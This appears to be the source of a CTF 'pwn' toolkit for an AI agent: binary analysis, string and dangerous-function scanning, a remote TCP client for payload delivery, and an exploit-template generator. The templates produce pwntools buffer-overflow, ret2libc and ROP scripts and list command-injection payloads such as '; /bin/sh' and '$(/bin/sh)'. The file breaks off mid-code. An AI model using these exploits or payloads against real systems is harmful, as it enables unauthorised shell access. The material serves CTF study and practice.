import { z } from "zod";
import * as fs from "fs";
import { ToolRegistry } from "./registry";

export function createPwnTools(): ToolRegistry {
  const registry = new ToolRegistry();

  registry.register({
    name: "binary_analysis",
    description: "二进制文件基础分析：检测文件类型(ELF/PE/Mach-O)、架构、32/64位、保护机制",
    parameters: z.object({
      path: z.string().describe("二进制文件路径"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path } = args;
      try {
        const buf = fs.readFileSync(path);
        const header = buf.slice(0, 32);
        const magic = header.toString("hex").toUpperCase();

        let fileType = "未知";
        let arch = "未知";
        let bits = "未知";
        let endianness = "未知";
        let protections: string[] = [];

        if (buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46) {
          fileType = "ELF";
          const ei_class = buf[4];
          bits = ei_class === 1 ? "32-bit" : ei_class === 2 ? "64-bit" : "未知";
          endianness = buf[5] === 1 ? "Little Endian" : "Big Endian";
          const e_type = buf[16];
          const typeNames: Record<number, string> = { 1: "REL(可重定位)", 2: "EXEC(可执行)", 3: "DYN(共享库/PIC)", 4: "CORE(Core文件)" };
          const type = typeNames[e_type] || `Unknown(${e_type})`;

          if (buf[4] === 2) {
            const e_entry = buf.readBigUInt64LE(24);
            protections.push(`入口点: 0x${e_entry.toString(16)}`);
          }
          protections.push(`类型: ${type}`);

          if (buf.includes(Buffer.from("GNU_STACK")) || buf.includes(Buffer.from("GNU_RELRO"))) {
            protections.push("RELRO: 部分/完整");
          }
          if (buf.includes(Buffer.from(".note.ABI-tag"))) protections.push("栈保护: 可能开启");
          if (type === "DYN" || type === "EXEC") protections.push("PIE: 可能开启(DYN类型)");
          if (buf.includes(Buffer.from("__stack_chk_fail"))) protections.push("Stack Canary: 检测到");

        } else if (buf[0] === 0x4d && buf[1] === 0x5a) {
          fileType = "PE (Windows)";
          const peOffset = buf.readUInt32LE(0x3c);
          if (buf[peOffset] === 0x50 && buf[peOffset + 1] === 0x45) {
            const machine = buf.readUInt16LE(peOffset + 4);
            arch = machine === 0x14c ? "x86" : machine === 0x8664 ? "x64" : `Unknown(0x${machine.toString(16)})`;
            const optionalHeaderSize = buf.readUInt16LE(peOffset + 20);
            const magic = buf.readUInt16LE(peOffset + 24);
            bits = magic === 0x10b ? "32-bit" : magic === 0x20b ? "64-bit" : "未知";

            const dllChars = buf.readUInt16LE(peOffset + 24 + 70);
            if (dllChars & 0x40) protections.push("ASLR/PIE: 已启用(DYNAMIC_BASE)");
            if (dllChars & 0x100) protections.push("NX DEP: 已启用(HIGH_ENTROPY_VA)");
            if (dllChars & 0x2000) protections.push("CFG: Control Flow Guard");
          }

        } else if (buf[0] === 0xcf && buf[1] === 0xfa) {
          fileType = "Mach-O (macOS/iOS 64-bit)";
          bits = "64-bit";
          const cputype = buf.readUInt32LE(4);
          arch = cputype === 0x1000007 ? "x86_64" : cputype === 0x100000c ? "ARM64" : "未知";

        } else if (buf[0] === 0xca && buf[1] === 0xfe) {
          fileType = "Mach-O (32-bit)";
          bits = "32-bit";

        } else if (buf[0] === 0x50 && buf[1] === 0x4b) {
          fileType = "ZIP/PK (可能是JAR/APK/Office文档)";
        } else if (buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47) {
          fileType = "PNG 图片";
        } else if (buf[0] === 0xff && buf[1] === 0xd8) {
          fileType = "JPEG 图片";
        } else {
          fileType = `未知 (magic: ${magic.slice(0, 16)})`;
        }

        return `[二进制分析] ${path}\n大小: ${buf.length} 字节\n\n文件类型: ${fileType}\n架构: ${arch}\n位数: ${bits}\n字节序: ${endianness}\n\n保护机制:\n${protections.length ? protections.map((p) => `  ${p}`).join("\n") : "  (未检测到或不适用)"}`;
      } catch (err: any) {
        return `[分析失败] ${err.message}`;
      }
    },
  });

  registry.register({
    name: "extract_strings",
    description: "从二进制文件中提取可打印字符串（类似 strings 命令）",
    parameters: z.object({
      path: z.string().describe("二进制文件路径"),
      minLength: z.number().optional().describe("最小字符串长度，默认 4"),
      encoding: z.enum(["ascii", "utf16"]).optional().describe("编码类型，默认 ascii"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path, minLength = 4, encoding = "ascii" } = args;
      try {
        const buf = fs.readFileSync(path);
        const strings: string[] = [];

        if (encoding === "ascii") {
          let current = "";
          for (const byte of buf) {
            if (byte >= 0x20 && byte <= 0x7e) {
              current += String.fromCharCode(byte);
            } else {
              if (current.length >= minLength) strings.push(current);
              current = "";
            }
          }
          if (current.length >= minLength) strings.push(current);
        } else {
          const utf16Buf = buf.toString("utf16le");
          let current = "";
          for (const ch of utf16Buf) {
            const code = ch.charCodeAt(0);
            if (code >= 0x20 && code <= 0x7e) {
              current += ch;
            } else {
              if (current.length >= minLength) strings.push(current);
              current = "";
            }
          }
          if (current.length >= minLength) strings.push(current);
        }

        const interesting = strings.filter((s) =>
          /flag|ctf|password|secret|key|http|\/bin\/|\/etc\/|\\\\x[0-9a-f]/i.test(s) ||
          /addr|printf|scanf|system|exec|fork|malloc|free/i.test(s)
        );

        return `[字符串提取] ${path}\n总字符串数: ${strings.length}\n\n感兴趣的字符串 (${interesting.length}):\n${interesting.slice(0, 100).map((s) => `  "${s}"`).join("\n")}${interesting.length > 100 ? `\n... 还有 ${interesting.length - 100} 条` : ""}`;
      } catch (err: any) {
        return `[提取失败] ${err.message}`;
      }
    },
  });

  registry.register({
    name: "vulnerability_scan",
    description: "检测二进制中的常见漏洞模式（危险函数、格式化字符串、整数溢出等）",
    parameters: z.object({ path: z.string().describe("二进制文件路径") }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path } = args;
      try {
        const buf = fs.readFileSync(path);
        const data = buf.toString("binary");

        const dangerousFunctions = [
          { name: "strcpy", desc: "缓冲区溢出：无长度检查" },
          { name: "strcat", desc: "缓冲区溢出：无长度检查" },
          { name: "gets", desc: "缓冲区溢出：无长度检查（极危险）" },
          { name: "sprintf", desc: "缓冲区溢出：无长度检查" },
          { name: "scanf", desc: "缓冲区溢出：可能溢出" },
          { name: "system", desc: "命令执行：可能存在命令注入" },
          { name: "execve", desc: "命令执行：可能执行任意命令" },
          { name: "popen", desc: "命令执行：可能执行任意命令" },
          { name: "atoi", desc: "整数溢出：可能导致整数绕过" },
          { name: "atol", desc: "整数溢出：可能导致整数绕过" },
          { name: "strtol", desc: "整数溢出：检查错误处理" },
          { name: "memcpy", desc: "缓冲区溢出：检查长度参数" },
          { name: "alloca", desc: "栈溢出：在栈上分配可变大小" },
          { name: "vsprintf", desc: "格式化字符串漏洞" },
          { name: "vprintf", desc: "格式化字符串漏洞" },
          { name: "vsnprintf", desc: "格式化字符串漏洞" },
          { name: "read", desc: "缓冲区溢出：检查长度和返回值" },
          { name: "recv", desc: "缓冲区溢出：检查长度参数" },
          { name: "recvfrom", desc: "缓冲区溢出：检查长度参数" },
          { name: "memmove", desc: "缓冲区溢出：检查长度" },
          { name: "realloc", desc: "堆漏洞：UAF/Double Free 可能" },
          { name: "free", desc: "堆漏洞：检查是否 double free" },
        ];

        const findings: string[] = [];
        for (const fn of dangerousFunctions) {
          const pattern = new RegExp(fn.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g");
          let match;
          while ((match = pattern.exec(data)) !== null) {
            findings.push(`  ⚠️ ${fn.name}: ${fn.desc}`);
            break;
          }
        }

        const formatStrVuln = /"%[^%]*%[sd]"/.test(data);
        if (formatStrVuln) findings.push("  ⚠️ 格式化字符串漏洞：检测到潜在的格式化字符串模式");

        return `[漏洞模式扫描] ${path}\n\n危险函数调用:\n${findings.length ? findings.join("\n") : "  ✓ 未检测到危险函数"}\n\n建议:\n- strcpy/gets/sprintf 等无边界检查函数是栈溢出的主要来源\n- system/execve 等函数结合用户输入可能导致命令执行\n- 检查是否存在格式化字符串漏洞（printf(user_input)）\n- 检查整数溢出是否可导致缓冲区绕过`;
      } catch (err: any) {
        return `[扫描失败] ${err.message}`;
      }
    },
  });

  registry.register({
    name: "exploit_template",
    description: "生成 Pwn Exploit 模板（Python pwntools 脚本）",
    parameters: z.object({
      binaryType: z.enum(["elf_32", "elf_64", "pe", "通用"]).describe("二进制类型"),
      hasCanary: z.boolean().optional().describe("是否有 Stack Canary"),
      hasNx: z.boolean().optional().describe("是否有 NX (DEP)"),
      hasPie: z.boolean().optional().describe("是否有 PIE/ASLR"),
      vulnType: z.enum(["stack_bof", "format_string", "heap_uaf", "heap_double_free", "integer_overflow", "command_injection", "ret2libc", "ret2shellcode", "rop_chain", "unknown"]).describe("漏洞类型"),
      binaryPath: z.string().optional().describe("二进制文件路径"),
      remoteAddr: z.string().optional().describe("远程地址，如 1.2.3.4:4567"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { binaryType, hasCanary = false, hasNx = true, hasPie = true, vulnType, binaryPath = "./vuln", remoteAddr } = args;

      const arch = binaryType.includes("32") ? "i386" : "amd64";
      const bufSize = binaryType.includes("32") ? "32" : "64";

      const remoteLines = remoteAddr
        ? `host = '${remoteAddr.split(":")[0]}'\nport = ${remoteAddr.split(":")[1] || "0"}\n# p = remote(host, port)`
        : `# p = remote('target.com', 4444)`;

      const canaryLine = hasCanary
        ? "canary_leak = ...  # 泄露 canary 值"
        : "# 无 canary";

      const canaryPayload = hasCanary
        ? "    canary_leak,  # 泄露的 canary 值"
        : "";

      const nxComment = hasNx
        ? "# NX 开启，需要 ret2libc 或 ROP"
        : "# NX 关闭，可直接 shellcode";

      const pieComment = hasPie
        ? "# PIE 开启，需要泄露基地址"
        : "# PIE 关闭，地址固定";

      const backtick = String.fromCharCode(96);

      const stackBof = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        `context.arch = '${arch}'`,
        `context.log_level = 'info'`,
        "",
        `binary = ELF('${binaryPath}')`,
        "libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # 调整路径",
        "",
        "# p = process(binary.path)",
        remoteLines,
        "",
        "# 缓冲区大小 (需通过逆向确认)",
        `buffer_size = ${bufSize}`,
        "",
        "# Canary 泄露 (如果有)",
        canaryLine,
        "",
        "# Ret2libc 地址",
        nxComment,
        pieComment,
        "",
        "payload = flat([",
        "    b'A' * buffer_size,",
        canaryPayload,
        "    b'B' * 8,  # 保存的 RBP",
        "    binary.symbols['system'],  # 或 ROP 链",
        "    b'\\x00' * 8,",
        "    next(libc.search(b'/bin/sh')),",
        "])",
        "",
        "p.sendline(payload)",
        "p.interactive()",
      ].join("\n");

      const formatString = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# 格式化字符串漏洞利用",
        "# 1. 泄露栈上的值",
        "# 2. 控制返回地址",
        "",
        "# 阶段1: 确认漏洞",
        "payload = b'%p.' * 30",
        "# p.sendline(payload)",
        "",
        "# 阶段2: 计算偏移",
        "# 发现偏移后：%N$p 可以直接获取第N个参数",
        "# %N$n 可以向第N个参数指向的地址写入值",
        "",
        "# 控制 GOT 表中的某个函数（如 printf）为 system",
        "# 然后触发该函数，参数为 '/bin/sh'",
      ].join("\n");

      const heapUaf = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# Use-After-Free 利用模板",
        "# 核心：分配 A -> 释放 A -> 分配 B (可改写 A 的元数据)",
        "",
        "# tcache poisoning (glibc 2.27+)",
        "# 1. 分配一个 chunk",
        "# 2. 释放它 (进入 tcache)",
        "# 3. 分配相同大小的 chunk (从 tcache 获取，可控 fd/bk)",
        "# 4. 写入目标地址到 fd",
        "# 5. 再次分配，chunk 会被放到目标地址",
        "",
        "# fastbin dup (glibc < 2.27)",
        "# 1. 释放一个 chunk",
        "# 2. 再分配一个相同大小的 chunk (从 fastbin 获取)",
        "# 3. 释放它 (fastbin 中现在有两个相同的 chunk)",
        "# 4. 分配两次 (获得两个指向同一内存的指针)",
      ].join("\n");

      const commandInjection = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# 命令注入利用",
        "# 如果程序将用户输入直接拼接到 system()/execve()",
        "",
        "# 分号分隔",
        "payload = b'; /bin/sh'",
        "# 管道符",
        "payload = b'| /bin/sh'",
        "# AND 连接",
        "payload = b' && /bin/sh'",
        "# 反引号",
        `payload = b'${backtick}/bin/sh${backtick}'`,
        "# $()",
        "payload = b'$(/bin/sh)'",
        "# 换行符",
        "payload = b'\\n/bin/sh'",
      ].join("\n");

      const ret2libcTpl = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# Ret2libc: 利用已经加载的 libc 中的 system()",
        "# 不需要知道 system() 的精确地址",
        "",
        "# 1. 泄露 libc 基地址 (通过 puts/printf 输出某个 GOT 表项)",
        "# 2. 计算 system() 和 '/bin/sh' 地址",
        "# 3. 构造 ROP 链调用 system('/bin/sh')",
        "",
        "puts_addr = leaked_puts - libc.symbols['puts']",
        "libc_base = puts_addr - libc.symbols['puts']",
        "system_addr = libc_base + libc.symbols['system']",
        "binsh_addr = libc_base + next(libc.search(b'/bin/sh'))",
      ].join("\n");

      const ret2Shellcode = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        `context.arch = '${arch}'`,
        "",
        "# NX 关闭，可以执行栈上的 shellcode",
        `shellcode = shellcraft.${arch}.sh()`,
        "shellcode_bytes = asm(shellcode)",
        "",
        "# 找一个指向栈缓冲区的地址",
        "# 通过信息泄露或猜测",
        "buffer_addr = 0x7fffffffe000  # 示例地址",
        "",
        "payload = shellcode_bytes.ljust(buffer_size, b'A') + p64(buffer_addr)",
      ].join("\n");

      const integerOverflow = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# 整数溢出利用",
        "# 如果程序使用有符号整数处理缓冲区大小",
        "# 负数会绕过 size 检查，但在 memcpy 时变为大正数",
        "",
        "# 1. 找到整数检查的位置",
        "# 2. 传入 -1 (0xFFFFFFFF) 作为 size",
        "# 3. 绕过检查后触发大拷贝",
      ].join("\n");

      const ropChain = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# ROP Chain: 利用 gadget 构造任意调用",
        "# 1. 寻找 pop rdi; ret gadget",
        "# 2. 寻找 system() 地址",
        "# 3. 寻找 '/bin/sh' 字符串",
        "",
        "pop_rdi_ret = 0x400683  # 示例，需通过 ROPgadget 获取",
        "pop_rsi_ret = 0x400681",
        "system_addr = binary.symbols['system']",
        "binsh_addr = next(binary.search(b'/bin/sh'))",
        "",
        "payload = b'A' * 72  # offset",
        "payload += p64(pop_rdi_ret)",
        "payload += p64(binsh_addr)",
        "payload += p64(system_addr)",
      ].join("\n");

      const templateMap: Record<string, string> = {
        stack_bof: stackBof,
        format_string: formatString,
        heap_uaf: heapUaf,
        command_injection: commandInjection,
        ret2libc: ret2libcTpl,
        ret2shellcode: ret2Shellcode,
        integer_overflow: integerOverflow,
        rop_chain: ropChain,
        heap_double_free: heapUaf,
        unknown: stackBof,
      };

      const template = templateMap[vulnType] || templateMap.stack_bof;
      return `[Exploit模板] ${vulnType} - ${binaryType}\n\n已生成 pwntools 模板：\n\n${template}\n\n提示:\n- 使用 ROPgadget 查找 gadget: ROPgadget --binary ${binaryPath}\n- 使用 checksec 检查保护: checksec ${binaryPath}\n- 使用 pwn init 创建项目: pwn init ${binaryPath}`;
    },
  });

  registry.register({
    name: "elf_got_plt_analysis",
    description: "ELF GOT/PLT 分析：解析动态链接表，提取导入函数地址",
    parameters: z.object({
      path: z.string().describe("ELF 二进制文件路径"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path } = args;
      try {
        const buf = fs.readFileSync(path);
        if (buf[0] !== 0x7f || buf[1] !== 0x45 || buf[2] !== 0x4c || buf[3] !== 0x46) {
          return "[ELF GOT/PLT分析] 不是有效的 ELF 文件";
        }

        const is64 = buf[4] === 2;
        const isLE = buf[5] === 1;
        const ei_class = buf[4];

        const results: string[] = [];

        if (ei_class === 2) {
          const dynSectionOffset = isLE ? buf.readBigUInt64LE(24) : buf.readBigUInt64BE(24);
          results.push(`入口点: 0x${dynSectionOffset.toString(16)}`);

          let offset = 0;
          while (offset < buf.length - 68) {
            const p_type = buf.readUInt32LE(offset + 4);
            if (p_type === 1) {
              const p_offset = Number(buf.readBigUInt64LE(offset + 8));
              const p_filesz = Number(buf.readBigUInt64LE(offset + 32));
              if (p_offset && p_filesz) {
                results.push(`LOAD段 @0x${p_offset.toString(16)}, 大小 0x${p_filesz.toString(16)}`);
              }
            }
            if (p_type === 2) {
              const p_offset = Number(buf.readBigUInt64LE(offset + 8));
              const p_filesz = Number(buf.readBigUInt64LE(offset + 32));
              results.push(`DYNAMIC段 @0x${p_offset.toString(16)}, 大小 0x${p_filesz.toString(16)}`);

              if (p_offset && p_filesz) {
                let dynamicOffset = p_offset;
                const tags: string[] = [];
                while (dynamicOffset < p_offset + p_filesz) {
                  const d_tag = Number(buf.readBigUInt64LE(dynamicOffset));
                  if (d_tag === 0) break;
                  const d_val = Number(buf.readBigUInt64LE(dynamicOffset + 8));
                  const tagNames: Record<number, string> = {
                    1: "NEEDED", 2: "PLTRELSZ", 3: "PLTGOT", 4: "HASH",
                    5: "STRTAB", 6: "SYMTAB", 10: "STRSZ", 11: "SYMENT",
                    23: "JMPREL", 25: "PLTREL",
                  };
                  tags.push(`  ${tagNames[d_tag] || `TAG_${d_tag}`} = 0x${d_val.toString(16)}`);
                  dynamicOffset += 16;
                }
                results.push("动态链接标签:\n" + tags.join("\n"));
              }
            }
            offset += 56;
          }
        }

        if (ei_class === 1) {
          results.push("32位 ELF - GOT/PLT 简化分析");
          const e_entry = buf.readUInt32LE(24);
          results.push(`入口点: 0x${e_entry.toString(16)}`);
        }

        const hasStackCanary = buf.includes(Buffer.from("__stack_chk_fail"));
        const hasFORTIFY = buf.includes(Buffer.from("__stack_chk_guard"));
        const hasPIE = buf.includes(Buffer.from("Position Independent Executable")) ||
          buf.includes(Buffer.from("Shared object file"));

        results.push(`\n安全检查:\n  Stack Canary: ${hasStackCanary ? "✅ 已启用" : "❌ 未启用"}`);
        results.push(`  FORTIFY: ${hasFORTIFY ? "✅ 已启用" : "❌ 未启用"}`);
        results.push(`  PIE: ${hasPIE ? "✅ 可能启用 (DYN类型)" : "❌ 未启用"}`);

        return `[ELF GOT/PLT分析] ${path}\n架构: ${is64 ? "x86_64" : "i386"} (${isLE ? "小端" : "大端"})\n\n${results.join("\n")}\n\n提示: 使用 readelf -d 查看动态段, objdump -d -j .plt 查看PLT`;
      } catch (err: any) {
        return `[ELF分析失败] ${err.message}`;
      }
    },
  });

  registry.register({
    name: "nc_remote_client",
    description: "远程TCP连接测试（类似 nc），自动重试+连通性探测，用于 Pwn 题目远程服务交互/靶机 banner 抓取/payload投递",
    parameters: z.object({
      host: z.string().describe("目标主机 IP"),
      port: z.number().describe("目标端口"),
      sendData: z.string().optional().describe("要发送的数据（hex 前缀 0x 自动转字节）"),
      sendDataHex: z.string().optional().describe("要发送的原始十六进制字节（可选，优先级高于 sendData 字符串），如 deadbeef"),
      timeout: z.number().optional().describe("单轮数据收发 idle 超时毫秒，默认 6000，最小 1000（<1000 自动提升；连接握手另有独立 10s+ 超时）"),
      retries: z.number().optional().describe("连接失败重试次数，默认 3（指数退避：1s/2s/4s）"),
      sendNewline: z.boolean().optional().describe("sendData 后是否自动追加换行，默认 true"),
      bannerFirst: z.boolean().optional().describe("先等服务端主动发 banner（2s），再发 sendData，默认 true"),
    }),
    category: "pwn",
    requirePermission: true,
    execute: async (args: any) => {
      const net = require("net");
      const {
        host,
        port,
        sendData,
        sendDataHex,
        timeout = 6000,
        retries = 3,
        sendNewline = true,
        bannerFirst = true,
      } = args;

      // timeout 最小值保护：防止 LLM 传 5 以为是秒（实际毫秒），导致 505ms 超时
      const effTimeout = Math.max(Number(timeout) || 6000, 1000);
      // 连接建立（TCP 握手）独立超时，至少 10s，跨网/DNS 慢时不误杀
      const connectTimeout = Math.max(effTimeout * 2, 10000);

      // 字节数组化 payload：sendDataHex 优先，sendData 字符串+可选换行次之
      let payloadBytes: Buffer | null = null;
      if (sendDataHex && typeof sendDataHex === "string" && sendDataHex.trim()) {
        try {
          const h = sendDataHex.trim().replace(/^0x/i, "").replace(/\s+/g, "");
          if (h.length % 2 !== 0) throw new Error("hex 长度必须为偶数");
          payloadBytes = Buffer.from(h, "hex");
        } catch (err: any) {
          return `[NC参数错误] sendDataHex 解析失败: ${err.message}`;
        }
      } else if (sendData != null) {
        payloadBytes = Buffer.from(
          String(sendData) + (sendNewline ? "\n" : "")
        );
      }

      const tryOnce = (attempt: number): Promise<string> =>
        new Promise((resolve) => {
          let resolved = false;
          let connectTimer: NodeJS.Timeout | null = null;
          const finish = (result: string) => {
            if (resolved) return;
            resolved = true;
            if (connectTimer) { clearTimeout(connectTimer); connectTimer = null; }
            try { client.destroy(); } catch {}
            resolve(result);
          };

          const header = attempt > 1 ? `[NC第${attempt}次尝试] ` : "[NC] ";
          const client = net.createConnection({ host, port }, () => {
            // 连接已建立：清除连接超时。
            // 注意：不在此处设 socket idle 超时（client.setTimeout），
            // 因为 bannerFirst 的 1800ms 等待期间 idle 计时器会与 banner 读取冲突误杀。
            // 数据收发阶段的超时统一由下方 stage 里的 setTimeout(flush, effTimeout) 控制。
            if (connectTimer) { clearTimeout(connectTimer); connectTimer = null; }

            let result = `${header}${host}:${port} 已连接\n`;

            const received: Buffer[] = [];
            client.on("data", (data: Buffer) => received.push(data));

            const flush = (reason: string) => {
              const raw = Buffer.concat(received);
              let out = "";
              if (raw.length > 0) {
                const text = raw.toString("utf-8").replace(/\0/g, "\\x00");
                out = `接收(${raw.length} bytes):\n${text}`;
                if (raw.length > 8192) {
                  out += `\n(... 共 ${raw.length} 字节，前 8KB 已显示，hex 尾部: ${raw.slice(-32).toString("hex")})`;
                } else {
                  out += `\nhex 尾部: ${raw.slice(-32).toString("hex")}`;
                }
              }
              finish(`${result}${out ? out + "\n" : ""}${reason}`);
            };

            let stage = () => {
              if (payloadBytes) {
                client.write(payloadBytes, (err?: Error) => {
                  if (err) {
                    result += `发送失败: ${err.message}\n`;
                    flush("(发送错误，断开)");
                    return;
                  }
                  result += `发送 ${payloadBytes!.length} bytes: ${
                    payloadBytes!.length <= 200
                      ? payloadBytes!.toString("utf-8").replace(/\0/g, "\\x00")
                      : "(前200字节展示)\n" +
                        payloadBytes!.slice(0, 200).toString("utf-8").replace(/\0/g, "\\x00") +
                        `\n... 共 ${payloadBytes!.length} bytes，hex 尾部: ${payloadBytes!.slice(-32).toString("hex")}`
                  }\n`;
                  setTimeout(() => flush(`(发送后等待 ${Math.round(effTimeout / 1000)}s，连接关闭)`), effTimeout);
                });
              } else {
                setTimeout(() => flush(`(未发送 payload，等待 ${Math.round(effTimeout / 1000)}s 收取 banner 后关闭)`), effTimeout);
              }
            };

            if (bannerFirst) {
              setTimeout(stage, 1800);
            } else {
              stage();
            }
          });

          // 连接建立阶段（TCP 握手）独立超时，不与数据 idle 超时混用
          connectTimer = setTimeout(() => {
            finish(`${header}连接建立超时（${connectTimeout}ms，目标可能不可达或防火墙拦截）`);
          }, connectTimeout);

          client.on("error", (err: Error) => {
            finish(`${header}错误: ${err.message}`);
          });
          client.on("close", (hadError: boolean) => {
            if (!resolved) {
              finish(`${header}连接已关闭${hadError ? "，有错误" : ""}`);
            }
          });
        });

      const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
      for (let attempt = 1; attempt <= Math.max(1, retries); attempt++) {
        const result = await tryOnce(attempt);
        // 连接成功（结果里有"已连接"或接收数据非空）→ 直接返回，不再重试
        if (result.includes("已连接") || /接收\(\d+ bytes\)/.test(result)) {
          return result;
        }
        if (attempt < Math.max(1, retries)) {
          const backoff = Math.pow(2, attempt - 1) * 1000;
          await sleep(backoff);
        } else {
          return result + `\n已重试 ${retries} 次仍未建立有效连接，建议确认靶机存活/地址端口正确`;
        }
      }
      return `[NC] 重试后仍失败: ${host}:${port}`;
    },
  });

  registry.register({
    name: "memory_layout",
    description: "内存布局分析：基于二进制类型和保护机制推断栈/堆布局",
    parameters: z.object({
      binaryType: z.enum(["elf_32", "elf_64", "pe", "macho", "通用"]).describe("二进制类型"),
      protections: z.array(z.string()).optional().describe("已检测的保护机制"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { binaryType, protections = [] } = args;

      const arch = binaryType.includes("32") || binaryType === "pe" ? "i386" : "amd64";
      const ptrSize = arch === "i386" ? 4 : 8;
      const hasCanary = protections.includes("canary") || protections.includes("Stack Canary");
      const hasNX = protections.includes("NX") || protections.includes("DEP");
      const hasPIE = protections.includes("PIE");

      const stackLayout = [
        "高地址",
        "┌─────────────────────┐",
        "│   环境变量/参数     │",
        "├─────────────────────┤",
        "│   栈帧 (Stack Frame) │",
        "│   - local vars      │",
        hasCanary ? "│   - ⚠️ Canary值      │" : "│   - 无Canary         │",
        "│   - Saved RBP       │",
        "│   - Return Address  │",
        "├─────────────────────┤",
        "│   堆 (Heap)         │",
        "├─────────────────────┤",
        "│   BSS/Data段        │",
        "├─────────────────────┤",
        "│   .text (代码段)    │",
        "低地址",
      ];

      const exploitationPath: string[] = [];
      if (!hasNX) {
        exploitationPath.push("1. NX关闭 → 可直接在栈/堆执行 Shellcode (ret2shellcode)");
      } else {
        exploitationPath.push("1. NX开启 → 需要 ret2libc 或 ROP 链");
      }
      if (hasCanary) {
        exploitationPath.push("2. 有Canary → 需要信息泄露(格式化字符串/未初始化变量)绕过");
      }
      if (hasPIE) {
        exploitationPath.push("3. PIE开启 → 需要泄露代码段基地址(通过GOT/PLT)");
      }
      exploitationPath.push(`4. 指针大小: ${ptrSize}字节 (${arch})`);

      const heapNotes = [
        "glibc < 2.27: fastbin attack",
        "glibc >= 2.27: tcache poisoning",
        "glibc >= 2.29: tcache double free key检查",
        "glibc >= 2.32: safe linking",
        "架构特定: 32位有mallopt, 64位更严格",
      ];

      return `[内存布局分析] ${binaryType}\n\n${stackLayout.join("\n")}\n\n利用路径:\n${exploitationPath.join("\n")}\n\n堆利用笔记:\n${heapNotes.map((n) => `  • ${n}`).join("\n")}\n\n建议:\n- 使用 checksec 确认保护\n- 使用 readelf -s 查看符号\n- 使用 objdump -d 查看汇编`;
    },
  });

  /**
   * pwn_static_analysis：一次性提取本地 ELF 二进制所有静态信息，
   * 避免 LLM 多轮分步分析慢。输出：
   *  1) file header（魔数/位宽/类型/入口点）
   *  2) checksec 级保护推断（RELRO/Canary/NX/PIE/RPATH）
   *  3) 有趣字符串（≥5字节，含 flag/bin/sh/cat/key/input/win/success/format 关键词）
   *  4) 危险符号调用（strcpy/gets/sprintf/system/execve/... 及地址）
   *  5) 动态符号表（含 .plt 可调用函数）+ 导入 .dynsym
   *  6) main/win/vuln 等关键函数的反汇编片段（若系统有 objdump）
   *  7) GOT 地址表（若系统有 objdump/objdump -R / readelf -r）
   */
  registry.register({
    name: "pwn_static_analysis",
    description:
      "一次性 PWN 静态分析：file/checksec/字符串/危险符号/GOT/关键函数反汇编。本地 ELF 题目第一步直接调用，减少多轮分步分析慢",
    parameters: z.object({
      path: z.string().describe("本地 ELF 二进制路径，如 ./pwn / /tmp/challenge/pwn"),
      disassembleBytes: z.number().optional().describe("每关键函数反汇编最大字节，默认 2000"),
      maxStrings: z.number().optional().describe("感兴趣字符串最大条数，默认 120"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path, disassembleBytes = 2000, maxStrings = 120 } = args;
      const sections: string[] = [];
      const header = "[PWN一次性静态分析] " + path + "\n" + "=".repeat(64) + "\n";

      // --- 1/7 直接复用 binary_analysis 工具的输出 ---
      try {
        const ba = registry.get("binary_analysis");
        if (ba) sections.push(await ba.execute({ path }));
      } catch (err: any) {
        sections.push(`[header分析失败] ${err.message}`);
      }

      // --- 2/7 checksec 级保护（shell commands，若系统有 pwntools/checksec 直接用，否则降级） ---
      try {
        const { spawnSync } = require("child_process") as typeof import("child_process");
        const cs = spawnSync("checksec", ["--file=" + path, "--format=json"], {
          timeout: 6000,
          encoding: "utf-8",
        });
        if (cs.status === 0 && cs.stdout && cs.stdout.trim()) {
          sections.push(`\n── 2) checksec（系统 pwntools checksec 工具） ──\n${cs.stdout.trim()}`);
        } else {
          // 降级：file + readelf -l 识别 GNU_STACK NX，readelf -d 识别 RELRO
          const file = spawnSync("file", [path], { timeout: 5000, encoding: "utf-8" });
          const readelfL = spawnSync("readelf", ["-l", path], { timeout: 5000, encoding: "utf-8" });
          const readelfD = spawnSync("readelf", ["-d", path], { timeout: 5000, encoding: "utf-8" });
          const readelfS = spawnSync("readelf", ["-S", path], { timeout: 5000, encoding: "utf-8" });
          const summary: string[] = [];
          if (file.status === 0) summary.push(`file: ${file.stdout.trim().split("\n")[0]}`);
          if (readelfL.status === 0) {
            const stack = (readelfL.stdout.match(/GNU_STACK[^\n]*/) || [])[0] || "";
            summary.push(`GNU_STACK: ${stack || "未找到"}` + (stack.includes("RWE") ? "（NX 关闭，栈可执行）" : stack.includes("RW ") ? "（NX 启用）" : ""));
          }
          if (readelfD.status === 0) {
            const hasNow = /BIND_NOW/.test(readelfD.stdout);
            const hasRelro = /GNU_RELRO/.test(readelfD.stdout);
            summary.push(
              `RELRO: ${hasNow ? "Full RELRO" : hasRelro ? "Partial RELRO" : "未启用"}`
            );
            const rpath = (readelfD.stdout.match(/RPATH|RUNPATH[^\n]*/g) || []).join(" / ");
            if (rpath) summary.push(`RPATH/RUNPATH: ${rpath}`);
          }
          if (readelfS.status === 0) {
            const buf = Buffer.isBuffer(fs.readFileSync(path)) ? fs.readFileSync(path) : null;
            if (buf && buf.includes(Buffer.from("__stack_chk_fail")))
              summary.push("Stack Canary: 检测到（引用__stack_chk_fail）");
            if (readelfS.stdout.includes(".dynsym") || readelfD.stdout.includes("NEEDED"))
